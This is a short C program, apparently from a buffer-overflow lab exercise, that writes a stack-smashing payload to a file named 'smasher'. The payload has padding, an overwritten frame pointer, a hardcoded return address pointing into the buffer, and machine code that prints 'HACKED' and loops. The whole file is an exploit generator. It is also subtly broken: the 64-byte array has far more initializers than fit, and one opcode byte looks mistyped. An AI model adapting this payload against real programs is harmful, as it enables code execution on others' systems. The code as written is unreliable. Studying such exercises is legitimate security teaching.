#include <stdlib.h>
#include <stdio.h>
#include <string.h>

static char code[64] = { 

                       0x00,0x00,0x00,0x00,0x00,0x00,       
                       0x00,0x00,0x00,0x00,0x00,0x00,             
                       0x00,0x00,0x00,0x00,0x00,0x00, 
                       0x00,0x00,0x00,0x00,0x00,0x00, 
                       0x00,0x00,0x00,0x00,0x00,0x00, 
                       0x00,0x00,         

                       0xd0, 0xe1, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00,  // static link
                       0x10, 0xe0, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00,  // ret adress -> buffer
                       0xc8, 0xe2, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00,  // string 
                       0x64, 0xe0, 0xff, 0xff, 0xff, 0x1f, 0x00, 0x00,   // inteiro

                       0x55,
                       0x48, 0x89, 0xe5, 
                       0x48, 0x83, 0xec, 0x20,       
                       0x89, 0x7d, 0xec,               
                       0x48, 0x89, 0x75, 0xe0,           
                       0xc6, 0x45, 0xf8, 0x48,         
                       0xc6, 0x45, 0xf9, 0x41,        
                       0xc6, 0x45, 0xfa, 0x43,          
                       0x06, 0x45, 0xfb, 0x4b,       
                       0xc6, 0x45, 0xfc, 0x45,       
                       0xc6, 0x45, 0xfd, 0x44,          
                       0xc6, 0x45, 0xfe, 0x0a,         
                       0xc6, 0x45, 0xff, 0x00,      
                       0x48, 0x8d, 0x45, 0xf8,            
                       0x48, 0x89, 0xc7,             
                       0xe8, 0xd3, 0xfe, 0xff, 0xff,       
                       0xeb, 0xf2,                   
                       0x90      

};

int main(int argc, const char * argv[])
{ 
    FILE *badfile;
    badfile = fopen("smasher", "w");
    fwrite(code, sizeof(char), sizeof(code), badfile);
    printf("SIZE=%lu\n",sizeof(code));
  return 0;
}
